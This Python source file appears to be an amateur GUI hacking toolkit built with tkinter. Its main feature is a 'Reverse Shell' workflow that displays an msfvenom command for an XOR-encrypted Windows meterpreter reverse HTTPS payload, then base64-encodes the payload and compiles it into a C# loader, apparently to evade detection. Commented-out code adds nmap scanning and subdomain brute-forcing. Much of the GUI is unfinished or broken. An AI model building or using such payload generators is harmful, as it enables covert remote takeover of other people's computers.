from paramiko import SSHClient, AutoAddPolicy
import os.path
import colorama
from colorama import Fore
from subprocess import call
import smtplib
import requests
#import qrcode
import webbrowser
import cv2
import tkinter as tk
from tkinter.ttk import *
from tkinter import *
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from ttkbootstrap.themes import *

class Window(tk.Tk):
    def __init__(self):

        tk.Tk.__init__(self)

        self.title('Login self')
        self.configure(bg='black')
        self.geometry("1920x1080")


        def Twitter():

                url = 'https://twitter.com/gr0tten0lm1'
                webbrowser.get().open(url)

        def GitHub():

                url = 'https://github.com/as-squirrel'
                webbrowser.get().open(url)



        def reverseshell():


                        revlabel1 = ttk.Label(self, text = "Do you already have a file to encrypt")
                        revlabel1.pack(pady= 3, padx = 3)
                        revbutton1 = ttk.Button(self, text='no',bootstyle="warning-outline",  command=lambda: [destroy2(),no()])
                        revbutton1.place(x = 900, y= 20, width=100)
                        revbutton2 = ttk.Button(self, text='yes',bootstyle="warning-outline",  command=lambda: [])
                        revbutton2.place(x = 900, y= 60, width=100)
                        #Reverse shell

                        def destroy2():
                                revlabel1.destroy()
                                revbutton1.destroy()
                                revbutton2.destroy()
                        def no():
                                info1 = ttk.Label(self, text = "Copy and paste the line bellow and change  IP nad Ports")
                                info1.pack(pady= 3, padx = 3)

                                info2 = ttk.Label(self, text = "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=(enter your IP) LPORT=443 --encrypt xor --encrypt-key test --format raw > file")
                                info2.pack(pady= 3, padx = 3)
                                norevbutton1 = ttk.Button(self, text='Press when you are done',bootstyle="success-outline",  command=lambda: [])
                                norevbutton1.place(x = 900, y= 90, width=230)


                                os.system('sudo apt-get install mono-mcs')

                                print(Fore.GREEN + "Starting encryption ......")

                                os.system('base64 wp1 > ewp1')

                                os.system('pluma ewp1')

                                print("Now copy the code and paste it down in the line 135 ")

                                os.system('pluma Program.cs')

                                done2 = input("Press ENTER to finish ")

                                os.system('mcs Program.cs')

                                print(Fore.BLUE + "The File is now ready!")




                        def yes ():

                                print(Fore.BLUE + "Installing the compiler ....")

                                os.system('sudo apt-get install mono-mcs')

                                print(Fore.GREEN + "Starting encryption ......")

                                os.system('base64 wp1 > ewp1')

                                os.system('pluma ewp1')

                                print("Now copy the code and paste it down in the line 135 ")

                                os.system('pluma Program.cs')

                                done2 = input("Press ENTER to finish ")

                                os.system('mcs Program.cs')

                                print(Fore.BLUE + "The File is now ready!")



        def Menu():

                 account_button1 = ttk.Button(self,text='Reverse Shell',  command=reverseshell)
                 account_button1.place(x = 200, y= 70, width=100)
                 account_button2 = ttk.Button(self,text='Subdomain Scanner',  command=NONE)
                 account_button2.place(x = 200, y= 100, width=100)
                 account_button3 = ttk.Button(self,text='Nmap',  command=NONE)
                 account_button3.place(x = 200, y= 130, width=100)
                 account_button4 = ttk.Button(self,text='Copy Website',  command=NONE)
                 account_button4.place(x = 200, y= 160, width=100)
                 account_button5 = ttk.Button(self,text='NONE',  command=NONE)
                 account_button5.place(x = 200, y= 190, width=100)
                 account_button1 = ttk.Button(self,text='Create QRCode',  command=NONE)
                 account_button1.place(x = 350, y= 70, width=100)
                 account_button2 = ttk.Button(self,text='NONE',  command=NONE)
                 account_button2.place(x = 350, y= 100, width=100)
                 account_button3 = ttk.Button(self,text='NONE',  command=NONE)
                 account_button3.place(x = 350, y= 130, width=100)
                 account_button4 = ttk.Button(self,text='NONE',  command=NONE)
                 account_button4.place(x = 350, y= 160, width=100)
                 account_button5 = ttk.Button(self,text='NONE',  command=NONE)
                 account_button5.place(x = 350, y= 190, width=100)

                 account_button6 = ttk.Button(self,text='See Twitter',bootstyle="warning-outline",  command=Twitter)
                 account_button6.place(x = 100, y= 40, width=100)
                 account_button7 = ttk.Button(self,text='See GitHub',bootstyle="warning-outline",  command=GitHub)
                 account_button7.place(x = 100, y= 10, width=100)

        def destroy1():
                first_button.destroy()

        first_button = ttk.Button(self, text ="Enter Menu",bootstyle="success-outline", compound = LEFT, command =lambda:[destroy1(), Menu()])
        first_button.pack(side = TOP)
    
        second_button = ttk.Button(self,text="Close Window", command=self.destroy)
        second_button.pack(side = TOP)
        second_button.place(x = 1400, y= 20, width=100)













        # def reverseshell():



        #                 inp = input(Fore.RED + 'Do you already have a file to encrypt yes/no : ')


        #                 #Reverse shell
        #                 if 'no' in inp:

        #                         print(Fore.GREEN + "Create now your own File .....")

        #                         print(Fore.BLUE + "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=(enter your IP) LPORT=443 --encrypt xor --encrypt-key test --format raw > wp1")

        #                         done1 = input("Press ENTER when done ")

        #                         print(Fore.GREEN + "Creating windows payload File ......")

        #                         print("Done")

        #                         print(Fore.BLUE + "Installing the compiler ....")

        #                         os.system('sudo apt-get install mono-mcs')

        #                         print(Fore.GREEN + "Starting encryption ......")

        #                         os.system('base64 wp1 > ewp1')

        #                         os.system('pluma ewp1')

        #                         print("Now copy the code and paste it down in the line 135 ")

        #                         os.system('pluma Program.cs')

        #                         done2 = input("Press ENTER to finish ")

        #                         os.system('mcs Program.cs')

        #                         print(Fore.BLUE + "The File is now ready!")




        #                 if 'yes' in inp:

        #                         print(Fore.BLUE + "Installing the compiler ....")

        #                         os.system('sudo apt-get install mono-mcs')

        #                         print(Fore.GREEN + "Starting encryption ......")

        #                         os.system('base64 wp1 > ewp1')

        #                         os.system('pluma ewp1')

        #                         print("Now copy the code and paste it down in the line 135 ")

        #                         os.system('pluma Program.cs')

        #                         done2 = input("Press ENTER to finish ")

        #                         os.system('mcs Program.cs')

        #                         print(Fore.BLUE + "The File is now ready!")



        # if '2' in option:

        #                 os.system('clear')


        #                 print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')
        #                 print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')      
        #                 print(Fore.LIGHTCYAN_EX + '|<1> Website Copy                                 <2> Create QRCode                       |')
        #                 print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
        #                 print(Fore.LIGHTCYAN_EX + '|<3> Port scanner                                          <4> SMTP Service               |')
        #                 print(Fore.LIGHTYELLOW_EX + '|                                                                                         |')
        #                 print(Fore.LIGHTCYAN_EX + '|<5> Subdomain scanner                                                                    |')
        #                 # print(Fore.LIGHTYELLOW_EX + '|-----------------------------------------------------------------------------------------|')



        #                 inp2 = input("Type here your option > ")

        #                 if '1' in inp2:

        #                         site = input(Fore.LIGHTYELLOW_EX + 'Type here the website (e.g. https://example.com) > ')

        #                         response = requests.get(site)
        #                         response.content
        #                         print(Fore.LIGHTCYAN_EX + response.content)
                        

        #                 if '2' in inp2:

        #                         qrdata = input('Type here the QRCode data > ')

        #                         img = qrcode.make(qrdata)

        #                         nafile = input('Type here the name of the File (e.g. example.png) > ')

        #                         img.save(nafile)


        # if '3' in option:

        #                 ip = input(Fore.LIGHTYELLOW_EX + 'Enter the target ip here > ')

        #                 print(Fore.LIGHTCYAN_EX + '.')

        #                 os.system('clear')

        #                 os.system('nmap -sV ' + ip)

        #                 print(Fore.GREEN + 'Done')



        # if '4' in option:

        #                 print('------------------')








        # if '5' in option:

        #                 domain = input(Fore.LIGHTYELLOW_EX + 'Enter here your domain (e.g. example.com > ')

        #                 flist = input('Which list do you want ? large/small > ')

        #                 if 'large' in flist:

        #                         subfile =  open('largelist.txt')

        #                         cont = subfile.read()
                                
        #                         subdomains = cont.splitlines()

        #                         subs_disc = []

        #                         for subdomain in subdomains:

        #                                 url = f"https://{subdomain}.{domain}"

        #                                 try:
        #                                         requests.get(url)
        #                                 except requests.ConnectionError:
                                                
        #                                         pass
                                        
        #                                 else:
        #                                         print(Fore.LIGHTCYAN_EX + "|+| subdomain found! > ", url)

        #                                         subs_disc.append(url)


        #                 if 'small' in flist:

        #                         subfile =  open('smalllist.txt')

        #                         cont = subfile.read()
                                
        #                         subdomains = cont.splitlines()

        #                         subs_disc = []

        #                         for subdomain in subdomains:

        #                                 url = f"http://{subdomain}.{domain}"

        #                                 try:
        #                                         requests.get(url)
        #                                 except requests.ConnectionError:
                                                
        #                                         pass
                                        
        #                                 else:
        #                                         print(Fore.LIGHTCYAN_EX + "|+| subdomain found! > ", url)

        #                                         subs_disc.append(url)

appid = Window()
appid.mainloop()